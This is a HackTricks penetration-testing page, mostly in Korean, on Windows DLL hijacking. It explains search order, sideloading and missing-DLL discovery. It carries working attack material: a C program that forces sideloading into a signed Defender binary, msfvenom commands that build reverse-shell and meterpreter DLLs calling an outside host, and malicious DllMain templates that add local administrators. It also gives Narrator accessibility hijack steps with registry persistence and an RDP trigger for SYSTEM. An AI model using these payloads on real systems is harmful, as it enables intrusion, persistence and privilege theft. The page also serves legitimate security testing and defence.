# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

Dll Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 의미합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포함합니다. 주로 코드 실행, persistence 달성, 그리고 덜 일반적으로는 privilege escalation에 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, 하이재킹 방식 자체는 목표에 관계없이 일관됩니다.

### 일반적인 기법

애플리케이션의 DLL 로드 전략에 따라 효과가 달라지는 여러 방법들이 사용됩니다:

1. **DLL Replacement**: 정식 DLL을 악성 DLL로 교체합니다. 선택적으로 원래 DLL의 기능을 유지하기 위해 DLL Proxying을 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 애플리케이션의 검색 패턴을 악용하여 정당한 DLL보다 먼저 검색되는 경로에 악성 DLL을 배치합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요하지만 존재하지 않는 DLL로 인식하고 로드하도록 악성 DLL을 생성합니다.
4. **DLL Redirection**: 애플리케이션이 악성 DLL을 가리키도록 `%PATH%`나 `.exe.manifest` / `.exe.local` 같은 검색 매개변수를 수정합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉토리에서 정식 DLL을 악성 DLL로 교체하는 방법으로, 종종 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉토리에 악성 DLL을 두어 Binary Proxy Execution 기법과 유사한 방식으로 작동합니다.

## 누락된 Dlls 찾기

시스템 내에서 누락된 Dlls를 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, 다음의 두 가지 필터를 **설정**하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../../images/image (153).png>)

일반적인 누락된 dll을 찾고 있다면 이 상태로 몇 초 동안 실행해 둡니다.  
특정 실행 파일 내의 누락된 dll을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 다른 필터를 설정하고, 해당 실행 파일을 실행한 뒤 이벤트 캡처를 중지해야 합니다.

## 누락된 Dll 악용

권한 상승을 위해 가장 좋은 기회는 권한 프로세스가 로드하려고 시도할 dll을 해당 프로세스가 검색할 경로 중 하나에 쓸 수 있는 경우입니다. 따라서, 원래 dll이 있는 폴더보다 먼저 검색되는 폴더에 dll을 쓸 수 있거나(특이한 경우), dll이 검색되는 어떤 폴더에 쓰기를 할 수 있고 원래 dll이 어떤 폴더에도 존재하지 않는 상황을 만들 수 있습니다.

### Dll 검색 순서

자세한 Dll 로드 방식은 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 확인할 수 있습니다.

Windows 애플리케이션은 미리 정의된 검색 경로 집합을 순차적으로 따라 DLL을 찾습니다. 악성 DLL이 이러한 디렉토리 중 하나에 전략적으로 배치되어 정식 DLL보다 먼저 로드되면 DLL hijacking 문제가 발생합니다. 이를 방지하려면 애플리케이션이 필요로 하는 DLL을 참조할 때 절대 경로를 사용하도록 하면 됩니다.

아래는 32-bit 시스템에서의 DLL 검색 순서입니다:

1. 애플리케이션이 로드된 디렉토리.
2. 시스템 디렉토리. 이 디렉토리 경로는 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하여 얻습니다.(_C:\Windows\System32_)
3. 16-bit 시스템 디렉토리. 이 디렉토리의 경로를 얻는 함수는 없지만 검색에 포함됩니다. (_C:\Windows\System_)
4. Windows 디렉토리. 이 디렉토리 경로는 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하여 얻습니다. (_C:\Windows_)
5. 현재 디렉토리.
6. PATH 환경 변수에 나열된 디렉토리들. 이는 **App Paths** 레지스트리 키로 지정된 애플리케이션별 경로를 포함하지 않습니다. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

위는 SafeDllSearchMode가 활성화된 경우의 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉토리가 두 번째 위치로 상승합니다. 이 기능을 비활성화하려면 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode 레지스트리 값을 생성하고 0으로 설정하세요(기본값은 활성화됨).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그와 함께 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉토리에서 시작됩니다.

마지막으로, dll이 이름 대신 절대 경로로 지정되어 로드될 수 있다는 점을 주의하세요. 이 경우 해당 dll은 오직 그 경로에서만 로드됩니다(해당 dll에 종속성이 있는 경우, 그 종속성들은 이름으로만 로드되었을 때와 동일한 방식으로 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

ntdll의 네이티브 API를 사용해 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하면 새로 생성된 프로세스의 DLL 검색 경로를 결정적으로 조작할 수 있습니다. 여기에서 공격자가 제어하는 디렉토리를 제공하면, 대상 프로세스가 DLL을 이름으로 해결(절대 경로가 아니고 안전한 로딩 플래그를 사용하지 않는 경우)할 때 로더가 그 디렉토리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 매개변수를 구성하고, 공격자가 제어하는 폴더를 가리키는 사용자 지정 DllPath(예: dropper/unpacker가 위치한 디렉토리)를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해결할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 있지 않더라도 신뢰성 있는 sideloading을 가능하게 합니다.

참고/제한사항
- 이는 생성되는 자식 프로세스에 영향을 미칩니다; 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않아야 함).
- KnownDLLs와 하드코딩된 절대 경로는 하이재킹할 수 없습니다. forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

간단한 C 예: (ntdll, wide strings, 오류 처리 단순화):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

운영상 사용 예
- 악성 xmllite.dll(필요한 함수를 export 하거나 실제 DLL로 proxy하는)을 DllPath 디렉토리에 배치합니다.
- 위 기법을 사용하여 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import를 해결하고 여러분의 DLL을 sideloads 합니다.

이 기법은 멀티 스테이지 sideloading 체인을 구동하는 사례로 in-the-wild에서 관찰되었습니다: 초기 런처가 헬퍼 DLL을 떨어뜨리고, 그 헬퍼가 Microsoft-signed 이며 hijackable 한 바이너리를 커스텀 DllPath로 스폰하여 스테이징 디렉토리에서 공격자의 DLL을 강제로 로드하게 만드는 식입니다.


#### Exceptions on dll search order from Windows docs

Windows 문서에서 표준 DLL 검색 순서에 대한 특정 예외가 다음과 같이 설명되어 있습니다:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### 권한 상승

**요구 사항**:

- **다른 권한으로 동작하거나 동작할 프로세스**(수평 이동 혹은 lateral movement)가 있고, 해당 프로세스가 **DLL이 없는** 경우를 식별합니다.
- **DLL이 검색될** 수 있는 **디렉토리**(실행 파일의 디렉토리 또는 system path 내의 디렉토리)에 대한 **쓰기 권한**이 있는지 확인합니다.

네, 기본적으로 **특권 실행 파일이 DLL이 빠져 있는 것을 찾는 것은 다소 드문 일**이고, **system path 폴더에 대한 쓰기 권한을 갖는 것은 더더욱 드문 일**입니다(기본적으로는 불가능합니다). 하지만 misconfigured 환경에서는 가능할 수 있습니다.\
요건을 우연히 충족하게 된다면, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 프로젝트의 **주 목적이 UAC 우회(bypass UAC)** 인 경우가 많지만, 해당 Windows 버전에 맞는 Dll hijaking의 **PoC**를 찾을 수 있으며(아마도 쓰기 권한이 있는 폴더 경로만 변경하면 됨) 이를 활용할 수 있습니다.

참고로 폴더에서 자신의 권한을 **확인하는 방법**은 다음과 같습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내부의 모든 폴더 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
또한 다음을 사용하여 executable의 imports와 dll의 exports를 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
System Path folder에 쓸 수 있는 권한이 있을 때 **abuse Dll Hijacking to escalate privileges**에 대한 전체 가이드는 다음을 확인하세요:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하기 위한 다른 흥미로운 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll._ 등이 있습니다.

### 예시

취약한 시나리오를 찾은 경우, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 실행 파일이 해당 DLL에서 임포트할 모든 함수를 최소한으로 내보내는 **dll을 만드는 것**입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** 권한을 상승시키는 데 유용하다는 점을 유의하세요. 실행을 위한 dll hijacking에 중점을 둔 이 DLL 하이재킹 연구에서 **유효한 dll을 만드는 방법**의 예를 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 **템플릿**으로 유용하거나 **필수 함수가 아닌 함수들을 내보내는 dll을 만드는** 데 쓸 수 있는 몇 가지 **기본 dll 코드**를 찾을 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 실행**할 수 있으면서도, 실제 라이브러리로의 모든 호출을 **중계(relay)**하여 **기대한 대로 노출되고 작동**하는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실제로 **대상 실행 파일을 지정하고 프록시화할 라이브러리를 선택**하여 **proxified dll을 생성**하거나 **Dll을 지정하여 proxified dll을 생성**할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 — x64 버전은 확인하지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자신만의

여러 경우에 컴파일한 Dll은 victim process에 의해 로드될 여러 함수를 반드시 **export several functions**해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load**되어 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점이 있는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows의 Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 여전히 탐색하며, 이를 hijacked하여 arbitrary code execution 및 persistence를 달성할 수 있다.

핵심 사실
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Procmon을 사용한 탐지
- 필터: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator를 시작하고 위 경로에 대한 로드 시도를 관찰한다.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **구성요소**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **예약된 작업**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`는 매일 오전 9:30에 로그온한 사용자 컨텍스트로 실행됩니다.
- **디렉터리 권한**: `CREATOR OWNER`에 의해 쓰기 가능하여 로컬 사용자가 임의 파일을 배치할 수 있습니다.
- **DLL 검색 동작**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려 시도하며 누락되면 "NAME NOT FOUND"를 기록하므로 로컬 디렉터리 우선 검색이 있음을 나타냅니다.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치한다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9:30에 실행될 때까지 기다린다.
3. 작업 실행 시 관리자 계정이 로그인되어 있으면, 악성 DLL이 관리자 세션에서 medium integrity로 실행된다.
4. standard UAC bypass techniques를 연결하여 medium integrity에서 SYSTEM 권한으로 승격시킨다.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
